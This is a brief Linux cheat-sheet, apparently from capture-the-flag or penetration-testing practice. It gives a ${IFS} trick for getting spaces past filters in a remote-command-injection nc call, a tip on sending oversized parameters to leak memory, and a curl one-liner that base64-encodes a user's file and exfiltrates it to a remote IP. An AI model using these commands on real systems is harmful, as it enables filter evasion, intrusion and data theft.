# Linux
space bash

`${IFS}` is a space delimiter for when you can't use a space in your rce command, so you can do `nc${IFS}<ip>${IFS}<port>`

If you have any parameters(that can be modified as in a web request), try overflowing the value(size) by specifying a very large size to see if there is any memory leak,(you might need to change memory size to get a memory leak with useful data) but a large enough one might work too and give some internal useful data like headers/secrets.

To get date in epoch format, use `date '+%s'`

to find duplicates in a file, use: `sort rooms.txt | uniq -cd`

To exfill data from the command line, use:

```text-plain
cat /home/dante/Downloads/.download.dat | base64 -w0 | xargs -I T curl 10.10.126.249:4444/?x=T
```